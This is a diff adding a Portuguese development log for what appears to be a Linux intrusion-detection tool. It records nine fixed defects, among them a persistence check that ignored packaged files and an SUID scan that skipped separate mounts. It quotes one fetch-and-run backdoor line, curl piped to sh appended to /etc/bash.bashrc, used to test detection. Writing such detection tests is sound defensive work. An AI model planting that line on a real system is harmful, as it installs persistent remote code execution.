@@ -2142,3 +2142,114 @@ razão de o `make` construir as duas arquiteturas.
 
 55 checks, 73 cenários, 108 execuções. Zero achado em Debian 12, Alpine 3.20,
 CentOS 7, Rocky 9 e Ubuntu 14.04, com cobertura completa nos três primeiros.
+
+---
+
+## Registro — revisão dos seis commits não revisados
+
+Seis commits, ~5200 linhas. Nove defeitos, e dois deles eram regressões que a
+suíte inteira aprovava.
+
+### A regressão que a suíte não pegava
+
+O bloco de isenção "tem dono de pacote, não é achado" foi aplicado a DOIS
+checks quando eu queria um. O `persist.shell_startup` passou a calar sobre
+arquivo empacotado — e `/etc/bash.bashrc` é empacotado.
+
+Medido: `curl -s http://…/p.sh | sh` acrescentado ali saía como **um aviso de
+hash**, com o check de persistência mudo. É backdoor de manual.
+
+A correção não foi desfazer a isenção: foi trocar a condição. Não basta ter
+dono, tem que estar **provadamente intacto** — e a prova passou a existir com a
+fase 7. Sem prova disponível, não se suprime, porque ausência de prova não é
+prova de integridade. O comentário que estava lá dizia por escrito o limite
+("isto não vê modificação de arquivo empacotado") e ficou obsoleto no mesmo
+commit em que a fase 7 o resolveu.
+
+Resultado depois: dois sinais correlacionados, a linha suspeita e a prova de
+que o arquivo do pacote mudou.
+
+### A varredura de SUID não atravessava montagem
+
+A baseline de dispositivo era a do `/`. Como `-xdev`, mas medida no lugar
+errado: `/home` em partição própria — a norma em servidor — e `/tmp` em tmpfs —
+o padrão do systemd — ficavam INTEIROS de fora.
+
+Confirmado no host: um SUID em `~/.config` era invisível. A baseline passou a
+ser por RAIZ, e cada árvore listada é percorrida inteira.
+
+Isso trouxe o custo de verdade junto, e ele precisou de dois ajustes:
+
+```
+pular por nome    node_modules, .cache, .git, site-packages e afins. Um home
+                  de desenvolvedor tem 270 mil diretórios; o teto de 40 mil
+                  estourava e a varredura truncava em 15%
+profundidade      cinco níveis dentro de /home e /root
+```
+
+Pular árvore NOMEADA é melhor que truncar por contagem: a exclusão é conhecida,
+está escrita, e é a mesma em todo host — enquanto um corte por contagem cai num
+lugar diferente a cada máquina e não diz onde parou.
+
+### A mesma colisão de usrmerge, terceira vez
+
+`map[string]string` nos três backends de hash. Sob usrmerge, `/bin/sh` e
+`/usr/bin/sh` geram as MESMAS chaves; guardando um caminho só, a segunda
+inserção sobrescreve a primeira.
+
+**274 arquivos** num host real saíam como "não pude comparar", entre eles
+`/bin/sh`, `/bin/kill` e `/bin/true`. Depois: 6, e todos legítimos.
+
+Eu já tinha corrigido esse defeito nos dois lados da pergunta de propriedade,
+no commit anterior, e o reproduzi em três funções novas.
+
+### Uma corrida que o detector nunca viu
+
+`go test -race ./...` NÃO alcança a suíte de cenários, que exige tag de build. E
+foi ali que a corrida estava: os subtestes usam `t.Parallel()` e a validação de
+IDs montava um mapa global preguiçosamente.
+
+Junto veio um segundo defeito no mesmo lugar: a validação rodava dentro de
+`assertScenario`, que **nunca executa para cenário pulado** — e
+`UntestableChecks` só existe em cenário pulado. Um ID errado ali faria um check
+parecer coberto sem nunca ter sido demonstrado.
+
+Virou teste serial sobre todos os cenários, e o `make race` passou a rodar o
+detector nos dois lugares. Rodá-lo só onde já estava coberto dá a sensação de
+cobertura sem a cobertura.
+
+### Os menores
+
+```
+sort com I/O       o comparador chamava Lstat POR COMPARAÇÃO — O(n log n)
+                   syscalls — e comparador que faz I/O nem define ordem
+                   consistente se um arquivo sumir no meio
+ações perdidas     quando o primeiro comando de um achado já aparecera, o
+                   `break` fazia aquele achado não contribuir com NADA. O
+                   passo perdido era o `gcore`, único jeito de preservar
+                   memória antes de matar
+prefixo x token    `/usr/local/bin/foo` casava com quem executa `…/foobar`
+Vanished           faltava a guarda no check de egress
+ToUpper e índice   o parser de sudoers indexava a string maiúscula e fatiava a
+                   original; ToUpper muda o tamanho em bytes de alguns
+                   caracteres
+símbolo e cópia    symlink não tem conteúdo próprio e virava lacuna falsa;
+                   diversão do dpkg idem; mtree era copiado inteiro para ser
+                   lido
+```
+
+### O erro que cometi pela quarta vez
+
+Declarei o limite de profundidade de `/home` SEMPRE que o diretório existe, em
+vez de só quando algo foi realmente cortado. É a mesma confusão entre **escolha
+de escopo** e **cegueira** que já corrigi no xdev do SUID, na lista vazia de
+módulos e na diversão do dpkg.
+
+Vale mais registrar o padrão que a correção: toda vez que escrevo um limite,
+a tentação é anunciá-lo incondicionalmente — e um parcial que nunca sai gasta
+exatamente o sinal que separa "não achei" de "não consegui olhar", que é a
+razão de esta ferramenta existir.
+
+### Estado
+
+55 checks, 73 cenários, 108 execuções. `make race` limpo nos dois pacotes.
